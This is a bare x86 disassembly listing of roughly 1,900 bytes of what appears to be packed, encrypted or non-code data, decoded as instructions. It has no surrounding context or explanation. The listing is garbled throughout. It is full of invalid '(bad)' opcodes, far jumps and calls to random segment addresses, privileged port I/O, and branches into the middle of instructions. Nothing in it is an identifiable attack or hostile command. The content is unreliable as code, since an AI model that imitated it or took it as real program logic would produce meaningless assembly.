  41de41:	aam    0x14
  41de43:	cmp    bh,BYTE PTR [edx+0x23ec809a]
  41de49:	mov    edx,0x40f0edc8
  41de4e:	aaa    
  41de4f:	aad    0x6
  41de51:	mov    al,ds:0xa27abe79
  41de56:	mov    fs,edi
  41de58:	cwde   
  41de59:	push   ebp
  41de5a:	mov    edx,0xf2ea3cb1
  41de5f:	shl    DWORD PTR [esi+0x35],1
  41de62:	inc    eax
  41de63:	mov    bl,0x45
  41de65:	call   0xc01b:0xf69e1d5c
  41de6c:	or     al,0x8f
  41de6e:	jmp    0x41decd
  41de70:	jbe    0x41de4b
  41de72:	ret    0x14c6
  41de75:	add    DWORD PTR [eax+0x51126ae6],eax
  41de7b:	sbb    eax,0x76245e81
  41de80:	iret   
  41de81:	sbb    al,0x8d
  41de83:	add    ebp,ebp
  41de85:	and    eax,0x24409bcb
  41de8a:	jno    0x41dee4
  41de8c:	(bad)
  41de8f:	ds mov bh,0x3d
  41de92:	adc    al,0x81
  41de94:	xor    cl,BYTE PTR [ebx]
  41de96:	sbb    eax,0x9cb1fe8b
  41de9b:	rcl    ebp,0x45
  41de9e:	add    BYTE PTR [edx],bl
  41dea0:	ret    
  41dea1:	(bad)  
  41dea2:	pop    edx
  41dea3:	stc    
  41dea4:	test   DWORD PTR [edi],esi
  41dea6:	mul    BYTE PTR [ebp-0x41]
  41dea9:	in     al,dx
  41deaa:	mov    cl,0x56
  41deac:	or     al,0x43
  41deae:	mov    bl,0x63
  41deb0:	je     0x41de96
  41deb2:	inc    ecx
  41deb3:	mov    edi,0x28d3fa39
  41deb8:	imul   esi,DWORD PTR fs:[esi],0xffffffbc
  41debc:	adc    ecx,ecx
  41debe:	add    esi,DWORD PTR fs:[edi]
  41dec1:	lds    ebx,FWORD PTR ss:[eax]
  41dec4:	mov    edx,0x1f3087ba
  41dec9:	(bad)  
  41decb:	mov    bh,0x2e
  41decd:	adc    BYTE PTR [edi+0x6fff5f61],cl
  41ded3:	jle    0x41de5c
  41ded5:	repnz pop esp
  41ded7:	mov    dh,BYTE PTR [ecx-0xf2d88aa]
  41dedd:	mov    BYTE PTR [edx-0x39a6d109],dh
  41dee3:	jns    0x41de97
  41dee5:	xor    DWORD PTR [esi],edx
  41dee7:	hlt    
  41dee8:	jmp    DWORD PTR [ecx+0x6]
  41deeb:	mov    ch,0x9d
  41deed:	and    al,0xd9
  41deef:	inc    edx
  41def0:	inc    esi
  41def1:	mov    WORD PTR [ebp+0x28],es
  41def4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41def5:	das    
  41def6:	mov    ds:0x21d9e5ed,eax
  41defb:	retf   
  41defc:	cmp    BYTE PTR [eax-0x63],bl
  41deff:	aad    0x82
  41df01:	sbb    BYTE PTR [edi-0x59],ah
  41df04:	inc    edx
  41df05:	into   
  41df06:	mov    edx,0xee1b89b0
  41df0b:	xor    dh,dl
  41df0d:	or     BYTE PTR [ecx-0x70],cl
  41df10:	mov    dh,0xd3
  41df12:	cli    
  41df13:	push   cs
  41df14:	or     al,0xa6
  41df16:	inc    eax
  41df17:	lock pop ecx
  41df19:	sbb    al,BYTE PTR [ebx-0x623b557d]
  41df1f:	div    DWORD PTR [esi+0x1f1138f6]
  41df25:	int3   
  41df26:	jp     0x41dee9
  41df28:	jp     0x41ded4
  41df2a:	sbb    al,0xdc
  41df2c:	fmul   DWORD PTR [esi+0x4b]
  41df2f:	jecxz  0x41df67
  41df31:	lahf   
  41df32:	fisttp WORD PTR [edi-0x16]
  41df35:	das    
  41df36:	out    0x19,al
  41df38:	jnp    0x41dfad
  41df3a:	jnp    0x41df94
  41df3c:	data16 xor al,0xd8
  41df3f:	push   ds
  41df40:	pushf  
  41df41:	jo     0x41dfba
  41df43:	test   eax,0xf2ae53e6
  41df48:	sub    eax,0x7eb57887
  41df4d:	push   ebp
  41df4e:	stos   DWORD PTR es:[edi],eax
  41df4f:	sbb    al,0x19
  41df51:	inc    eax
  41df52:	or     edx,DWORD PTR [ecx+0x29ca57c8]
  41df58:	mov    BYTE PTR [edi],ch
  41df5a:	call   0x4f12:0x84dc81ab
  41df61:	cmp    al,0x74
  41df63:	shr    al,0xe3
  41df66:	sti    
  41df67:	adc    bl,BYTE PTR [ecx]
  41df69:	mov    edi,0x8e3f44cd
  41df6e:	push   cs
  41df6f:	test   BYTE PTR [bx+si],bh
  41df72:	das    
  41df73:	ins    DWORD PTR es:[edi],dx
  41df74:	jmp    0x8ba7:0x84f22f38
  41df7b:	aas    
  41df7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df7d:	jg     0x41df08
  41df7f:	xor    ebp,DWORD PTR [eax]
  41df81:	xchg   BYTE PTR ds:0x1779b45e,al
  41df87:	dec    eax
  41df88:	(bad)  
  41df89:	xchg   esi,eax
  41df8a:	rol    BYTE PTR [esi-0x60160a58],1
  41df90:	inc    eax
  41df91:	inc    esi
  41df92:	inc    esi
  41df93:	(bad)  
  41df94:	(bad)  
  41df95:	dec    ebp
  41df96:	mov    bh,0x7e
  41df98:	xlat   BYTE PTR ds:[ebx]
  41df99:	int    0x6
  41df9b:	cdq    
  41df9c:	push   esp
  41df9d:	xchg   esp,eax
  41df9e:	adc    BYTE PTR [edi],al
  41dfa0:	ins    DWORD PTR es:[edi],dx
  41dfa1:	pop    edi
  41dfa2:	or     eax,0x60f3bcec
  41dfa7:	xchg   esi,eax
  41dfa8:	cmp    al,0x5a
  41dfaa:	sub    BYTE PTR ds:0xde9cdf26,al
  41dfb0:	dec    esp
  41dfb1:	push   0xbe1cb740
  41dfb6:	aas    
  41dfb7:	pop    ecx
  41dfb8:	mov    ecx,0xfa4abceb
  41dfbd:	dec    ebp
  41dfbe:	std    
  41dfbf:	inc    ebp
  41dfc0:	shr    ecx,1
  41dfc2:	leave  
  41dfc3:	mov    ds:0xd3084df7,al
  41dfc8:	inc    eax
  41dfc9:	xchg   esi,eax
  41dfca:	lahf   
  41dfcb:	pop    ss
  41dfcc:	and    bl,BYTE PTR ds:0x6b4aecf3
  41dfd2:	lds    ebx,FWORD PTR [ebx]
  41dfd4:	xor    al,0x82
  41dfd6:	or     esi,edi
  41dfd8:	shl    dh,1
  41dfda:	jnp    0x41df8d
  41dfdc:	dec    eax
  41dfdd:	pop    ebx
  41dfde:	push   ebx
  41dfdf:	cli    
  41dfe0:	verr   WORD PTR ds:[ebp-0x33d7fd42]
  41dfe8:	xor    DWORD PTR [eax],0x87f3a99
  41dfee:	push   ebp
  41dfef:	mov    es,WORD PTR [ebx+0x58]
  41dff2:	repnz xor ecx,DWORD PTR [esi]
  41dff5:	lahf   
  41dff6:	or     al,BYTE PTR [esi]
  41dff8:	test   al,0xb3
  41dffa:	xchg   ebx,eax
  41dffb:	fsubr  st(1),st
  41dffd:	add    eax,0x7d387e0e
  41e002:	mov    eax,0x8d8feffd
  41e007:	dec    eax
  41e008:	pop    esi
  41e009:	jp     0x41dfac
  41e00b:	sti    
  41e00c:	cdq    
  41e00d:	pop    DWORD PTR [eax-0x3c]
  41e010:	xchg   edx,eax
  41e011:	call   0x47043746
  41e016:	push   cs
  41e017:	inc    edx
  41e018:	xchg   ebp,eax
  41e019:	or     BYTE PTR [ebx],bh
  41e01b:	iret   
  41e01c:	sbb    BYTE PTR [eax+0x51],ch
  41e01f:	in     eax,0x16
  41e021:	pop    eax
  41e022:	lahf   
  41e023:	stos   BYTE PTR es:[edi],al
  41e024:	idiv   DWORD PTR [esi+0x5ddcb026]
  41e02a:	mov    bh,0x93
  41e02c:	test   eax,0x8e548159
  41e031:	les    ecx,FWORD PTR [eax]
  41e033:	push   esi
  41e034:	lea    ebp,[eax+ecx*1-0x2dc7ea15]
  41e03b:	je     0x41dfc2
  41e03d:	push   ebx
  41e03e:	push   eax
  41e03f:	push   eax
  41e040:	in     al,0x47
  41e042:	xchg   edi,eax
  41e043:	jns    0x41dfe2
  41e045:	or     ebx,eax
  41e047:	cmc    
  41e048:	ret    0x6210
  41e04b:	and    eax,0x6bd9fc08
  41e050:	outs   dx,DWORD PTR ds:[esi]
  41e051:	adc    BYTE PTR [ebx],bl
  41e053:	or     BYTE PTR [esi+0x37],0xd5
  41e057:	push   esp
  41e059:	inc    DWORD PTR [edi-0x5dd73f49]
  41e05f:	jns    0x41e054
  41e061:	cmp    esp,DWORD PTR [eax+0x9]
  41e064:	lahf   
  41e065:	or     eax,0x2354e54
  41e06a:	jmp    0xc48ea528
  41e06f:	cs ja  0x41e0cc
  41e072:	pop    ebx
  41e073:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e074:	mov    DWORD PTR [ecx-0x20],eax
  41e077:	fidiv  DWORD PTR [edi+eax*2]
  41e07a:	(bad)  
  41e07b:	sti    
  41e07c:	mov    eax,0x18dddeb8
  41e081:	sbb    dl,BYTE PTR [ebx]
  41e083:	jo     0x41e04f
  41e085:	(bad)
  41e088:	ret    0xe043
  41e08b:	in     eax,0x28
  41e08d:	add    eax,0x1444a6db
  41e092:	fimul  DWORD PTR [ecx+0x615f8505]
  41e098:	(bad)  [edi+0x6c9ae199]
  41e09e:	aad    0xb2
  41e0a0:	clc    
  41e0a1:	test   BYTE PTR ds:0xa0d16a5b,al
  41e0a7:	ret    0x23a9
  41e0aa:	enter  0x5fd4,0x2b
  41e0ae:	js     0x41e124
  41e0b0:	mov    al,0x50
  41e0b2:	xor    BYTE PTR [edx+0x25],dh
  41e0b5:	cmp    edi,DWORD PTR [esi+esi*4-0x48]
  41e0b9:	mov    edi,0x48c3d1c2
  41e0be:	fcmovb st,st(7)
  41e0c0:	cwde   
  41e0c1:	cs pop esi
  41e0c3:	mov    ebx,0x14d3ee69
  41e0c8:	mov    bh,0xd2
  41e0ca:	(bad)  
  41e0cb:	bound  edx,QWORD PTR [esi]
  41e0cd:	ds dec ecx
  41e0cf:	leave  
  41e0d0:	loope  0x41e06e
  41e0d2:	adc    al,0x11
  41e0d4:	fsubr  st,st(6)
  41e0d6:	sub    al,0x24
  41e0d8:	enter  0x2117,0x75
  41e0dc:	out    dx,eax
  41e0dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0de:	inc    edx
  41e0df:	cmc    
  41e0e0:	dec    edx
  41e0e1:	sub    DWORD PTR [ebx],ebx
  41e0e3:	sbb    ch,bh
  41e0e5:	ret    0x331
  41e0e8:	outs   dx,BYTE PTR ds:[esi]
  41e0e9:	cmc    
  41e0ea:	pop    eax
  41e0eb:	push   ds
  41e0ec:	xlat   BYTE PTR ds:[ebx]
  41e0ed:	arpl   WORD PTR [ecx-0x4f],bx
  41e0f0:	out    0x31,eax
  41e0f2:	inc    esi
  41e0f3:	sub    cl,BYTE PTR [ebx+0x29]
  41e0f6:	jge    0x41e0d5
  41e0f8:	in     eax,dx
  41e0f9:	imul   ch
  41e0fb:	pop    ds
  41e0fc:	mov    fs,esi
  41e0fe:	repnz fidivr WORD PTR [edx]
  41e101:	cmp    edx,ebp
  41e103:	(bad)  
  41e104:	popa   
  41e105:	mov    cl,0xf0
  41e107:	jae    0x41e0d4
  41e109:	adc    BYTE PTR [ecx-0x75d0a2fe],ah
  41e10f:	int    0xfa
  41e111:	adc    ebp,DWORD PTR [ebp-0x6493db80]
  41e117:	popf   
  41e118:	add    bl,dl
  41e11a:	sbb    al,0xdf
  41e11c:	das    
  41e11d:	or     eax,0x1a48546e
  41e122:	or     BYTE PTR [ecx],ah
  41e124:	rcr    DWORD PTR [ebx+0x5a6712ff],1
  41e12a:	add    eax,ecx
  41e12c:	sbb    esi,ebx
  41e12e:	ins    DWORD PTR es:[edi],dx
  41e12f:	jecxz  0x41e0b3
  41e131:	(bad)  
  41e132:	div    BYTE PTR [eax+esi*2]
  41e135:	inc    ecx
  41e136:	jmp    0xff8c894f
  41e13b:	inc    esp
  41e13c:	sbb    BYTE PTR [eax],al
  41e13e:	jb     0x41e150
  41e140:	adc    ch,dh
  41e142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e143:	dec    edx
  41e144:	popf   
  41e145:	jae    0x41e182
  41e147:	mov    ah,0x11
  41e149:	int    0xc9
  41e14b:	inc    edi
  41e14c:	stos   BYTE PTR es:[edi],al
  41e14d:	in     al,0xac
  41e14f:	xabort 0x63
  41e152:	ins    BYTE PTR es:[edi],dx
  41e153:	xchg   esi,eax
  41e154:	ja     0x41e107
  41e156:	mov    dh,0x75
  41e158:	mov    edx,0x14c5c744
  41e15d:	jle    0x41e1b7
  41e15f:	in     al,dx
  41e160:	(bad)  
  41e161:	fidiv  DWORD PTR [ebx]
  41e163:	xor    al,0xec
  41e165:	fs add al,0x1
  41e168:	ins    DWORD PTR es:[edi],dx
  41e169:	xchg   edx,eax
  41e16a:	xacquire xchg BYTE PTR [ecx],dl
  41e16d:	scas   al,BYTE PTR es:[edi]
  41e16e:	sub    al,0x3a
  41e171:	mov    eax,0x5904f223
  41e176:	neg    BYTE PTR [edi]
  41e178:	mov    ah,0x8b
  41e17a:	xchg   esp,eax
  41e17b:	stc    
  41e17c:	stos   BYTE PTR es:[edi],al
  41e17d:	mov    ecx,0xeec68f57
  41e182:	loope  0x41e1f0
  41e184:	sub    BYTE PTR [edx+0x4a7b531a],dh
  41e18a:	jmp    0x41e204
  41e18c:	retf   
  41e18d:	pop    esi
  41e18e:	ret    
  41e18f:	test   al,0x7a
  41e191:	jecxz  0x41e180
  41e193:	sub    BYTE PTR [eax-0x3d12c9d6],0x94
  41e19a:	cdq    
  41e19b:	xor    BYTE PTR [edx+ecx*8-0x48],bh
  41e19f:	test   al,0xd1
  41e1a1:	pop    esi
  41e1a2:	xor    BYTE PTR [eax-0x7831b3f0],0x40
  41e1a9:	lds    esp,FWORD PTR [edi+0x20]
  41e1ac:	mov    bl,0x74
  41e1ae:	call   0xcbaf:0xd37bb3ea
  41e1b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1b6:	popa   
  41e1b7:	out    dx,al
  41e1b8:	js     0x41e1ba
  41e1ba:	bt     DWORD PTR [ebp+0x52e85b74],ebx
  41e1c1:	jno    0x41e1bc
  41e1c3:	rcl    BYTE PTR [ebp+0x7b396a41],0x1e
  41e1ca:	cmp    dl,dh
  41e1cc:	loopne 0x41e233
  41e1ce:	and    al,0x20
  41e1d0:	fnstsw WORD PTR [ecx-0x10]
  41e1d3:	xlat   BYTE PTR ds:[ebx]
  41e1d4:	jmp    0xbb3:0x7e91233f
  41e1db:	xor    DWORD PTR [esi+0x51],ebx
  41e1de:	xor    al,0x5
  41e1e0:	mov    fs,WORD PTR [esi+0x74ae9ea2]
  41e1e6:	xor    edx,DWORD PTR [ebp-0x5c700f73]
  41e1ec:	jnp    0x41e21f
  41e1ee:	inc    eax
  41e1ef:	xchg   ecx,eax
  41e1f0:	xchg   edx,eax
  41e1f1:	push   edx
  41e1f2:	js     0x41e1f2
  41e1f4:	shl    DWORD PTR [edi-0x1b],1
  41e1f7:	ins    DWORD PTR es:[edi],dx
  41e1f8:	aam    0x10
  41e1fa:	out    0x40,eax
  41e1fc:	test   DWORD PTR [bp+0x78],edx
  41e200:	push   ebx
  41e201:	pop    ebx
  41e202:	dec    ebx
  41e203:	stos   BYTE PTR es:[edi],al
  41e204:	inc    eax
  41e205:	imul   ebx,esp
  41e208:	(bad)  
  41e209:	xchg   edx,eax
  41e20a:	jns    0x41e23b
  41e20c:	cmp    BYTE PTR es:[ecx+0x68e666fb],bh
  41e213:	pop    ebp
  41e214:	int3   
  41e215:	sbb    eax,0xffffffc1
  41e218:	clc    
  41e219:	xor    esp,esp
  41e21b:	fucomi st,st(5)
  41e21d:	inc    ecx
  41e21e:	and    cl,BYTE PTR [ebp-0x25]
  41e221:	mov    ch,0x12
  41e223:	cmp    DWORD PTR [edx+0x4],edi
  41e226:	std    
  41e227:	ret    0x8498
  41e22a:	xchg   ebx,eax
  41e22b:	ins    DWORD PTR es:[edi],dx
  41e22c:	dec    esi
  41e22d:	and    BYTE PTR [ebx],ah
  41e22f:	fsubr  st(7),st
  41e231:	fadd   DWORD PTR [edi+0x7e11798c]
  41e237:	adc    ch,BYTE PTR [ecx]
  41e239:	in     eax,0x9b
  41e23b:	add    dh,dh
  41e23d:	jne    0x41e26d
  41e23f:	lds    ebp,FWORD PTR [esi+eiz*2+0x15]
  41e243:	(bad)  
  41e244:	in     eax,dx
  41e245:	adc    DWORD PTR [eax+0xd],0x3703c0a7
  41e24c:	xlat   BYTE PTR ds:[ebx]
  41e24d:	aad    0x91
  41e24f:	call   0x4837:0x41f9b374
  41e256:	mov    fs,WORD PTR [esp+edx*1]
  41e259:	js     0x41e226
  41e25b:	jmp    0x41e2ca
  41e25d:	xchg   esi,eax
  41e25e:	pop    edx
  41e25f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e260:	jnp    0x41e294
  41e262:	jbe    0x41e2d9
  41e264:	mov    eax,ebp
  41e266:	mov    esp,0x46f07e06
  41e26b:	sub    DWORD PTR ds:0xf71114d7,0xae3f8a8f
  41e275:	jb     0x41e24d
  41e277:	inc    edi
  41e278:	in     eax,0x47
  41e27a:	push   0x2
  41e27c:	daa    
  41e27d:	stos   DWORD PTR es:[edi],eax
  41e27e:	jne    0x41e23e
  41e280:	lahf   
  41e281:	lea    esi,[edx+0x3f]
  41e284:	pusha  
  41e285:	pusha  
  41e286:	jecxz  0x41e24e
  41e288:	dec    ebp
  41e289:	dec    ecx
  41e28a:	dec    ebx
  41e28b:	add    eax,0x2a4cceb5
  41e290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e291:	and    eax,0xed180f1a
  41e296:	call   0x7d87:0x3370e745
  41e29d:	inc    edi
  41e29e:	mov    bl,0x55
  41e2a0:	pop    eax
  41e2a1:	mov    bh,0xca
  41e2a3:	xchg   ecx,eax
  41e2a4:	neg    DWORD PTR [ebp+0x59]
  41e2a7:	mov    cl,cl
  41e2a9:	cld    
  41e2aa:	hlt    
  41e2ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2ac:	add    al,0x2b
  41e2ae:	or     edx,DWORD PTR [ebp-0x35babf60]
  41e2b4:	popf   
  41e2b5:	or     eax,edi
  41e2b7:	mov    dl,0x32
  41e2b9:	jg     0x41e2dd
  41e2bb:	lock out dx,al
  41e2bd:	or     BYTE PTR [ebp+0x54],ch
  41e2c0:	inc    ebp
  41e2c1:	jmp    0x6867:0xbdd81815
  41e2c8:	sub    eax,0x12c19a40
  41e2cd:	sbb    bh,BYTE PTR [esi]
  41e2cf:	sbb    BYTE PTR [ecx+0x6c],bh
  41e2d2:	xchg   esi,eax
  41e2d3:	dec    ecx
  41e2d4:	mov    eax,0x1ff067ee
  41e2d9:	cdq    
  41e2da:	js     0x41e2de
  41e2dc:	inc    edx
  41e2dd:	pop    eax
  41e2de:	hlt    
  41e2df:	or     ebx,DWORD PTR [ecx]
  41e2e1:	pop    ecx
  41e2e2:	xchg   edi,eax
  41e2e3:	mov    esi,DWORD PTR [edx+eiz*4-0x3b]
  41e2e7:	addr16 leave 
  41e2e9:	push   edi
  41e2ea:	(bad)  
  41e2eb:	pop    esi
  41e2ec:	stos   DWORD PTR es:[edi],eax
  41e2ed:	gs mov esi,0xe1dab08b
  41e2f3:	mov    ds:0xd9a66c99,eax
  41e2f8:	cmp    eax,0xc981ff29
  41e2fd:	xchg   edx,eax
  41e2fe:	jmp    0x8dade3cc
  41e303:	mov    ah,0x31
  41e305:	shl    BYTE PTR [edx+0x7a],cl
  41e308:	dec    ebx
  41e309:	push   cs
  41e30a:	test   eax,0x8f9f5a31
  41e30f:	add    DWORD PTR [eax],ebx
  41e311:	mov    ecx,0x60cde5d3
  41e316:	fldenv [eax-0x3767fc3b]
  41e31c:	test   eax,0x3b36ec49
  41e321:	push   0x4c20bd97
  41e326:	jne    0x41e359
  41e328:	or     al,0x7a
  41e32a:	pop    ebx
  41e32b:	sbb    eax,0x6f7a663b
  41e330:	stos   DWORD PTR es:[edi],eax
  41e331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e332:	sub    eax,0x8a7c7cb7
  41e337:	(bad)  
  41e338:	adc    esi,ebx
  41e33a:	out    dx,al
  41e33b:	mov    ch,0xbf
  41e33d:	fabs   
  41e33f:	mov    cl,0x46
  41e341:	adc    esi,DWORD PTR [edx+ebp*2]
  41e344:	cmc    
  41e345:	push   ss
  41e346:	add    al,0x8
  41e348:	mov    ds:0xf5032aa1,eax
  41e34d:	pop    es
  41e34e:	(bad)  
  41e34f:	or     eax,DWORD PTR [eax]
  41e351:	ss enter 0x75d1,0x5a
  41e356:	cs dec edx
  41e358:	adc    BYTE PTR [ebp+ebx*4-0x53],cl
  41e35c:	xor    BYTE PTR [ecx+0x1e0fee6f],cl
  41e362:	stos   DWORD PTR es:[edi],eax
  41e363:	cmc    
  41e364:	jecxz  0x41e333
  41e366:	xchg   DWORD PTR [esi],ebx
  41e368:	call   0x5449:0xfc17a025
  41e36f:	scas   eax,DWORD PTR es:[edi]
  41e370:	scas   al,BYTE PTR es:[edi]
  41e371:	jnp    0x41e2f4
  41e373:	cdq    
  41e374:	mov    ebp,esp
  41e376:	mov    BYTE PTR [ebp+0x8],ah
  41e379:	xor    BYTE PTR [esi-0x7b8b3e88],ah
  41e37f:	or     esp,ebx
  41e381:	clc    
  41e382:	test   al,0x4f
  41e384:	dec    eax
  41e385:	xchg   ebp,eax
  41e386:	xchg   edi,eax
  41e387:	xchg   ebp,eax
  41e388:	sbb    al,BYTE PTR [ebx-0x13]
  41e38b:	sbb    ah,BYTE PTR [ebp-0x24]
  41e38e:	add    dh,BYTE PTR [esi]
  41e390:	clc    
  41e391:	ja     0x41e38c
  41e393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e394:	pop    ebx
  41e395:	push   esi
  41e396:	sbb    dl,BYTE PTR [ebp-0x70]
  41e399:	push   cs
  41e39a:	dec    edi
  41e39b:	jecxz  0x41e388
  41e39d:	popa   
  41e39e:	cs inc ebx
  41e3a0:	pop    ds
  41e3a1:	fs enter 0xcf73,0xff
  41e3a6:	mov    BYTE PTR [ebx+0x2f0e3411],0x77
  41e3ad:	cmp    ebx,ebx
  41e3af:	sahf   
  41e3b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3b1:	jo     0x41e3a7
  41e3b3:	mov    ecx,0x38a30a2e
  41e3b8:	sub    ecx,ebp
  41e3ba:	or     cl,BYTE PTR [esi-0x10]
  41e3bd:	and    BYTE PTR [edx+0x53],0xf6
  41e3c1:	jnp    0x41e37c
  41e3c3:	dec    ebx
  41e3c4:	jecxz  0x41e401
  41e3c6:	and    BYTE PTR [esi+0x7ac6b87c],ah
  41e3cc:	or     ecx,DWORD PTR [ebx-0x4e]
  41e3cf:	pop    ss
  41e3d0:	xchg   DWORD PTR [ebp+0x77],ebp
  41e3d3:	push   ebx
  41e3d4:	inc    eax
  41e3d5:	fmul   QWORD PTR [edi+0x18]
  41e3d8:	mov    DWORD PTR [esi+0x45a996e5],0x97b8f5d4
  41e3e2:	and    al,0x1b
  41e3e4:	jae    0x41e454
  41e3e6:	push   edi
  41e3e7:	in     eax,dx
  41e3e8:	pop    ss
  41e3e9:	sar    BYTE PTR [edx+0x6d48ec12],0xbb
  41e3f0:	adc    al,0xe2
  41e3f2:	dec    esp
  41e3f4:	dec    ecx
  41e3f5:	xchg   ebx,eax
  41e3f6:	sahf   
  41e3f7:	enter  0x389c,0xf1
  41e3fb:	test   ax,0x50a6
  41e3ff:	mov    al,0x5c
  41e401:	lds    edx,FWORD PTR [edi+esi*8-0x9]
  41e405:	mov    bl,0xd9
  41e407:	or     bh,BYTE PTR [edi-0x46597674]
  41e40d:	mov    fs,ebp
  41e40f:	rcr    DWORD PTR [edx-0x5d7119a5],cl
  41e415:	ror    DWORD PTR [ebx-0x1e28962b],1
  41e41b:	in     eax,0x33
  41e41d:	test   eax,0xa5a7acfb
  41e422:	or     dh,BYTE PTR [edx+0x47]
  41e425:	mov    eax,0x401f4a55
  41e42a:	(bad)  
  41e42b:	push   edx
  41e42c:	xor    DWORD PTR [ebp-0x53],ebp
  41e42f:	mov    cl,0x1d
  41e431:	push   ebp
  41e432:	inc    ebx
  41e433:	jmp    0x41e46e
  41e435:	outs   dx,DWORD PTR ds:[esi]
  41e436:	aam    0x52
  41e438:	out    0x1c,al
  41e43a:	sbb    al,0xab
  41e43c:	repnz adc edi,edi
  41e43f:	iret   
  41e440:	test   DWORD PTR [ecx+0x353e82e4],esp
  41e446:	jmp    0x41e3d7
  41e448:	sub    DWORD PTR [eax-0x72],ebx
  41e44b:	dec    esi
  41e44c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e44d:	xor    al,0x79
  41e44f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e450:	or     BYTE PTR [esi+edi*8-0x2d06058],0xc0
  41e458:	push   es
  41e459:	mov    ebp,esp
  41e45b:	enter  0x253e,0x8b
  41e45f:	aaa    
  41e460:	push   eax
  41e461:	mul    BYTE PTR [eax+0x24cc9379]
  41e467:	pop    esi
  41e468:	sbb    bh,BYTE PTR [edi]
  41e46a:	outs   dx,BYTE PTR fs:[esi]
  41e46c:	or     al,dl
  41e46e:	daa    
  41e46f:	clc    
  41e470:	arpl   WORD PTR [eax-0x4fe85b53],bx
  41e476:	sbb    eax,esp
  41e478:	inc    esp
  41e479:	adc    eax,0xafe1bd02
  41e47e:	fimul  WORD PTR [ecx+0x6fed42e6]
  41e484:	mov    ecx,0xcf4a633
  41e489:	mov    eax,ds:0x93604c58
  41e48e:	jp     0x41e49a
  41e490:	jns    0x41e49d
  41e492:	pop    es
  41e493:	or     DWORD PTR [eax-0x223c36e],0x9
  41e49a:	xor    al,0x2
  41e49c:	mov    dl,0xfe
  41e49e:	shr    esi,0x37
  41e4a1:	aam    0x88
  41e4a3:	add    eax,0x88ac5a37
  41e4a8:	imul   BYTE PTR ds:0x8c3b2890
  41e4ae:	jne    0x41e4f5
  41e4b0:	adc    eax,0xdc12e4e6
  41e4b5:	lods   al,BYTE PTR ds:[esi]
  41e4b6:	popa   
  41e4b7:	mov    BYTE PTR [esi-0x4565b0f],dl
  41e4bd:	dec    esp
  41e4be:	cmovns esp,DWORD PTR [esi-0x6c417e62]
  41e4c5:	or     eax,0xd125cb55
  41e4ca:	mov    ecx,0x6fc334c
  41e4cf:	jecxz  0x41e488
  41e4d1:	pop    ecx
  41e4d2:	sbb    ch,bh
  41e4d4:	mov    ecx,DWORD PTR [eax-0x42]
  41e4d7:	mov    al,ds:0xa7a46c
  41e4dc:	xor    eax,0x99b757d
  41e4e1:	pop    edx
  41e4e2:	or     eax,0x4a40afaf
  41e4e7:	push   ebp
  41e4e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4e9:	shr    DWORD PTR [ecx],cl
  41e4eb:	and    eax,0x201e7b7f
  41e4f0:	(bad)  
  41e4f1:	daa    
  41e4f2:	xchg   edi,eax
  41e4f3:	mov    dx,0x4bd6
  41e4f7:	test   al,0x93
  41e4f9:	jge    0x41e527
  41e4fb:	sub    al,0x29
  41e4fd:	cmp    BYTE PTR [eax],dh
  41e4ff:	inc    ecx
  41e500:	jle    0x41e4c2
  41e502:	hlt    
  41e503:	push   esi
  41e504:	dec    ebx
  41e505:	jae    0x41e4f1
  41e507:	sub    al,0x78
  41e509:	out    dx,al
  41e50a:	mov    edi,0x64c2e919
  41e50f:	fsubr  st(0),st
  41e511:	sub    cl,ch
  41e513:	and    eax,0x92cada18
  41e518:	jns    0x41e544
  41e51a:	dec    ecx
  41e51b:	mov    bl,0xf8
  41e51d:	gs je  0x41e4db
  41e520:	bound  ebp,QWORD PTR [ecx+0x27]
  41e523:	repnz daa 
  41e525:	jns    0x41e5a6
  41e527:	cs mov ebp,0x850a0ad6
  41e52d:	add    eax,DWORD PTR [eax]
  41e52f:	fcmovu st,st(0)
  41e531:	les    eax,FWORD PTR [eax]
  41e533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e534:	mov    dl,0x7b
  41e536:	scas   eax,DWORD PTR es:[edi]
  41e537:	dec    ecx
  41e538:	inc    esi
  41e539:	loopne 0x41e4f9
  41e53b:	stos   BYTE PTR es:[edi],al
  41e53c:	mov    ch,0x97
  41e53e:	mov    ds:0x11d1a2b,eax
  41e543:	inc    edx
  41e544:	je     0x41e56d
  41e546:	imul   ax,bx,0xff9d
  41e54a:	dec    edx
  41e54b:	xchg   edx,eax
  41e54c:	mov    ebx,0xf38b413e
  41e551:	dec    esp
  41e552:	jno    0x41e5c8
  41e554:	sti    
  41e555:	fst    DWORD PTR [eax-0x2c]
  41e558:	inc    esi
  41e559:	sti    
  41e55a:	mov    al,0xb7
  41e55c:	or     esp,esi
  41e55e:	xor    eax,0x2b5f5181
  41e563:	sub    bh,BYTE PTR [edx+0x814bea3]
  41e569:	das    
  41e56a:	adc    BYTE PTR [edi-0x14e4609e],dh
  41e570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e571:	lods   eax,DWORD PTR ds:[esi]
  41e572:	push   es
  41e573:	mov    edx,ds
  41e575:	pop    ebx
  41e576:	ins    DWORD PTR es:[edi],dx
  41e577:	mov    ecx,0x15ae8f6a
  41e57c:	fcomp  st(6)
  41e57e:	jecxz  0x41e509
  41e580:	pop    ss
  41e581:	imul   BYTE PTR [eax-0x72]
  41e584:	jmp    0xa8e1:0x813934e4
  41e58b:	add    ebx,eax
  41e58d:	jno    0x41e5c1
  41e58f:	shr    dh,cl
  41e591:	sbb    DWORD PTR ds:0x75f53431,0x3f54b4ad
  41e59b:	and    bl,dl
  41e59d:	cwde   
  41e59e:	mov    ds:0x7926b65,al
